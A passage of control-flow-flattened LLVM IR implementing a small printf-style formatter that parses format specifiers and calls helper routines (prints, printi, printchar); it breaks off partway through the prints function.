    i32 2070245635, label %24
    i32 -150987083, label %32
    i32 -625221579, label %33
    i32 -1210676344, label %39
    i32 -323290573, label %40
    i32 1860340361, label %46
    i32 1936175411, label %49
    i32 -1348070135, label %50
    i32 -1451752055, label %56
    i32 -628061044, label %61
    i32 -1464011137, label %62
    i32 1561128727, label %68
    i32 -1768221590, label %73
    i32 1313404728, label %75
    i32 -1818819469, label %84
    i32 625338520, label %87
    i32 2136215290, label %93
    i32 -1225709401, label %99
    i32 2030742010, label %105
    i32 389919353, label %110
    i32 -2106216266, label %117
    i32 -1680788561, label %119
    i32 1638120387, label %120
    i32 -1054993824, label %126
    i32 -1873062717, label %132
    i32 1211848305, label %139
    i32 -1439432495, label %145
    i32 -23171171, label %150
    i32 -1107737170, label %157
    i32 1252848816, label %163
    i32 -467352923, label %170
    i32 1784770095, label %176
    i32 1533137934, label %181
    i32 -1887904793, label %188
    i32 1087309891, label %194
    i32 -1493021142, label %201
    i32 1707896312, label %207
    i32 -1156172195, label %212
    i32 -2129361987, label %219
    i32 1981577378, label %225
    i32 -894372995, label %232
    i32 999891688, label %238
    i32 1968933987, label %243
    i32 230802451, label %250
    i32 -647414507, label %256
    i32 64826723, label %262
    i32 -30804956, label %268
    i32 -1097777138, label %273
    i32 911422230, label %285
    i32 -841554590, label %286
    i32 -1568204278, label %287
    i32 1966611696, label %294
    i32 -695761461, label %295
    i32 111016654, label %298
    i32 -1112370423, label %302
    i32 -1369597559, label %305
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 -1395463301, i32 111016654
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 2070245635, i32 -841554590
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 -150987083, i32 -625221579
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 111016654, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 -1210676344, i32 -323290573
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 -1568204278, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 1860340361, i32 1936175411
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 1936175411, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 -1348070135, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 -1451752055, i32 -628061044
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 -1348070135, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 -1464011137, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 1561128727, i32 -1768221590
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 -1768221590, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 1313404728, i32 625338520
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 -1818819469, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 -1464011137, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 2136215290, i32 -1054993824
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 -1225709401, i32 2030742010
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i64*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 389919353, i32* %switchVar
  store i64* %103, i64** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i64*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 389919353, i32* %switchVar
  store i64* %108, i64** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i64*, i64** %.reg2mem78
  %111 = load i64, i64* %.reload79, align 8
  %112 = inttoptr i64 %111 to i8*
  store i8* %112, i8** %11, align 8
  %113 = load i8**, i8*** %4, align 8
  store i8** %113, i8*** %.reg2mem11
  %114 = load i8*, i8** %11, align 8
  %115 = icmp ne i8* %114, null
  %116 = select i1 %115, i32 -2106216266, i32 -1680788561
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %11, align 8
  store i32 1638120387, i32* %switchVar
  store i8* %118, i8** %.reg2mem80
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 1638120387, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.144, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %121 = load i32, i32* %7, align 4
  %122 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %123 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %121, i32 %122)
  %124 = load i32, i32* %9, align 4
  %125 = add nsw i32 %124, %123
  store i32 %125, i32* %9, align 4
  store i32 -695761461, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i8*, i8** %5, align 8
  %128 = load i8, i8* %127, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 100
  %131 = select i1 %130, i32 -1873062717, i32 -1107737170
  store i32 %131, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i8**, i8*** %4, align 8
  store i8** %133, i8*** %.reg2mem13
  %134 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %134, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %135 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %135, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %136 = load i32, i32* %.reload21, align 8
  store i32 %136, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %137 = icmp ule i32 %.reload25, 40
  %138 = select i1 %137, i32 1211848305, i32 -1439432495
  store i32 %138, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %140 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %141 = load i8*, i8** %140, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %142 = getelementptr i8, i8* %141, i32 %.reload24
  %143 = bitcast i8* %142 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %144 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %144, i32* %.reload20, align 8
  store i32 -23171171, i32* %switchVar
  store i32* %143, i32** %.reg2mem82
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %146 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %147 = load i8*, i8** %146, align 8
  %148 = bitcast i8* %147 to i32*
  %149 = getelementptr i8, i8* %147, i32 8
  store i8* %149, i8** %146, align 8
  store i32 -23171171, i32* %switchVar
  store i32* %148, i32** %.reg2mem82
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %151 = load i32, i32* %.reload83, align 4
  %152 = load i32, i32* %7, align 4
  %153 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %154 = call i32 @printi(i8** %.reload14, i32 %151, i32 10, i32 1, i32 %152, i32 %153, i32 97)
  %155 = load i32, i32* %9, align 4
  %156 = add nsw i32 %155, %154
  store i32 %156, i32* %9, align 4
  store i32 -695761461, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i8*, i8** %5, align 8
  %159 = load i8, i8* %158, align 1
  %160 = zext i8 %159 to i32
  %161 = icmp eq i32 %160, 120
  %162 = select i1 %161, i32 1252848816, i32 -1887904793
  store i32 %162, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = load i8**, i8*** %4, align 8
  store i8** %164, i8*** %.reg2mem26
  %165 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %165, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %166 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %166, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %167 = load i32, i32* %.reload34, align 8
  store i32 %167, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %168 = icmp ule i32 %.reload38, 40
  %169 = select i1 %168, i32 -467352923, i32 1784770095
  store i32 %169, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %171 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %172 = load i8*, i8** %171, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %173 = getelementptr i8, i8* %172, i32 %.reload37
  %174 = bitcast i8* %173 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %175 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %175, i32* %.reload33, align 8
  store i32 1533137934, i32* %switchVar
  store i32* %174, i32** %.reg2mem84
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %177 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %178 = load i8*, i8** %177, align 8
  %179 = bitcast i8* %178 to i32*
  %180 = getelementptr i8, i8* %178, i32 8
  store i8* %180, i8** %177, align 8
  store i32 1533137934, i32* %switchVar
  store i32* %179, i32** %.reg2mem84
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %182 = load i32, i32* %.reload85, align 4
  %183 = load i32, i32* %7, align 4
  %184 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %185 = call i32 @printi(i8** %.reload27, i32 %182, i32 16, i32 0, i32 %183, i32 %184, i32 97)
  %186 = load i32, i32* %9, align 4
  %187 = add nsw i32 %186, %185
  store i32 %187, i32* %9, align 4
  store i32 -695761461, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8*, i8** %5, align 8
  %190 = load i8, i8* %189, align 1
  %191 = zext i8 %190 to i32
  %192 = icmp eq i32 %191, 88
  %193 = select i1 %192, i32 1087309891, i32 -2129361987
  store i32 %193, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i8**, i8*** %4, align 8
  store i8** %195, i8*** %.reg2mem39
  %196 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %196, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %197, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %198 = load i32, i32* %.reload47, align 8
  store i32 %198, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %199 = icmp ule i32 %.reload51, 40
  %200 = select i1 %199, i32 -1493021142, i32 1707896312
  store i32 %200, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %202 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %203 = load i8*, i8** %202, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %204 = getelementptr i8, i8* %203, i32 %.reload50
  %205 = bitcast i8* %204 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %206 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %206, i32* %.reload46, align 8
  store i32 -1156172195, i32* %switchVar
  store i32* %205, i32** %.reg2mem86
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %208 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %209 = load i8*, i8** %208, align 8
  %210 = bitcast i8* %209 to i32*
  %211 = getelementptr i8, i8* %209, i32 8
  store i8* %211, i8** %208, align 8
  store i32 -1156172195, i32* %switchVar
  store i32* %210, i32** %.reg2mem86
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %213 = load i32, i32* %.reload87, align 4
  %214 = load i32, i32* %7, align 4
  %215 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
  %216 = call i32 @printi(i8** %.reload40, i32 %213, i32 16, i32 0, i32 %214, i32 %215, i32 65)
  %217 = load i32, i32* %9, align 4
  %218 = add nsw i32 %217, %216
  store i32 %218, i32* %9, align 4
  store i32 -695761461, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i8*, i8** %5, align 8
  %221 = load i8, i8* %220, align 1
  %222 = zext i8 %221 to i32
  %223 = icmp eq i32 %222, 117
  %224 = select i1 %223, i32 1981577378, i32 230802451
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load i8**, i8*** %4, align 8
  store i8** %226, i8*** %.reg2mem52
  %227 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %227, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %228 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %228, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %229 = load i32, i32* %.reload60, align 8
  store i32 %229, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %230 = icmp ule i32 %.reload64, 40
  %231 = select i1 %230, i32 -894372995, i32 999891688
  store i32 %231, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %233 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %234 = load i8*, i8** %233, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %235 = getelementptr i8, i8* %234, i32 %.reload63
  %236 = bitcast i8* %235 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %237 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %237, i32* %.reload59, align 8
  store i32 1968933987, i32* %switchVar
  store i32* %236, i32** %.reg2mem88
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %239 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %240 = load i8*, i8** %239, align 8
  %241 = bitcast i8* %240 to i32*
  %242 = getelementptr i8, i8* %240, i32 8
  store i8* %242, i8** %239, align 8
  store i32 1968933987, i32* %switchVar
  store i32* %241, i32** %.reg2mem88
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %244 = load i32, i32* %.reload89, align 4
  %245 = load i32, i32* %7, align 4
  %246 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %247 = call i32 @printi(i8** %.reload53, i32 %244, i32 10, i32 0, i32 %245, i32 %246, i32 97)
  %248 = load i32, i32* %9, align 4
  %249 = add nsw i32 %248, %247
  store i32 %249, i32* %9, align 4
  store i32 -695761461, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i8*, i8** %5, align 8
  %252 = load i8, i8* %251, align 1
  %253 = zext i8 %252 to i32
  %254 = icmp eq i32 %253, 99
  %255 = select i1 %254, i32 -647414507, i32 911422230
  store i32 %255, i32* %switchVar
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  %257 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %257, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %258 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %258, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %259 = load i32, i32* %.reload71, align 8
  store i32 %259, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %260 = icmp ule i32 %.reload75, 40
  %261 = select i1 %260, i32 64826723, i32 -30804956
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %263 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %264 = load i8*, i8** %263, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %265 = getelementptr i8, i8* %264, i32 %.reload74
  %266 = bitcast i8* %265 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %267 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %267, i32* %.reload70, align 8
  store i32 -1097777138, i32* %switchVar
  store i32* %266, i32** %.reg2mem90
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %269 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %270 = load i8*, i8** %269, align 8
  %271 = bitcast i8* %270 to i32*
  %272 = getelementptr i8, i8* %270, i32 8
  store i8* %272, i8** %269, align 8
  store i32 -1097777138, i32* %switchVar
  store i32* %271, i32** %.reg2mem90
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %.reload91 = load i32*, i32** %.reg2mem90
  %274 = load i32, i32* %.reload91, align 4
  %275 = trunc i32 %274 to i8
  %276 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %275, i8* %276, align 1
  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %277, align 1
  %278 = load i8**, i8*** %4, align 8
  %279 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %280 = load i32, i32* %7, align 4
  %281 = load i32, i32* %8, align 4
  %282 = call i32 @prints(i8** %278, i8* %279, i32 %280, i32 %281)
  %283 = load i32, i32* %9, align 4
  %284 = add nsw i32 %283, %282
  store i32 %284, i32* %9, align 4
  store i32 -695761461, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  store i32 1966611696, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 -1568204278, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i8**, i8*** %4, align 8
  %289 = load i8*, i8** %5, align 8
  %290 = load i8, i8* %289, align 1
  %291 = zext i8 %290 to i32
  call void @printchar(i8** %288, i32 %291)
  %292 = load i32, i32* %9, align 4
  %293 = add nsw i32 %292, 1
  store i32 %293, i32* %9, align 4
  store i32 1966611696, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  store i32 -695761461, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = load i8*, i8** %5, align 8
  %297 = getelementptr inbounds i8, i8* %296, i32 1
  store i8* %297, i8** %5, align 8
  store i32 1756217305, i32* %switchVar
  br label %loopEnd

; <label>:298:                                    ; preds = %loopEntry
  %299 = load i8**, i8*** %4, align 8
  %300 = icmp ne i8** %299, null
  %301 = select i1 %300, i32 -1112370423, i32 -1369597559
  store i32 %301, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = load i8**, i8*** %4, align 8
  %304 = load i8*, i8** %303, align 8
  store i8 0, i8* %304, align 1
  store i32 -1369597559, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %307 = bitcast %struct.__va_list_tag* %306 to i8*
  call void @llvm.va_end(i8* %307)
  %308 = load i32, i32* %9, align 4
  ret i32 %308

loopEnd:                                          ; preds = %302, %298, %295, %294, %287, %286, %285, %273, %268, %262, %256, %250, %243, %238, %232, %225, %219, %212, %207, %201, %194, %188, %181, %176, %170, %163, %157, %150, %145, %139, %132, %126, %120, %119, %117, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -732520997, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -732520997, label %first
    i32 1319802429, label %16
    i32 -436679867, label %18
    i32 -291903261, label %23
    i32 -440553668, label %26
    i32 -482508445, label %29
    i32 -763657609, label %34
    i32 64083731, label %35
    i32 -1224540993, label %39
    i32 -325871581, label %44
    i32 1612795719, label %45
    i32 -1345824980, label %46
    i32 1062686242, label %51
    i32 1173337540, label %52
    i32 -1619364080, label %56
    i32 -723289791, label %61
    i32 1277938148, label %64
    i32 -947415526, label %65
    i32 -1323940371, label %66
    i32 -1793370833, label %71
    i32 1390606630, label %78
    i32 623949192, label %81
    i32 -1004023613, label %82
    i32 596858984, label %86
    i32 87548182, label %91
    i32 785212703, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 1319802429, i32 -1345824980
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 -436679867, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 -291903261, i32 -482508445
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 -440553668, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 -436679867, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 -763657609, i32 64083731
  store i32 %33, i32* %switchVar
  br label %loopEnd

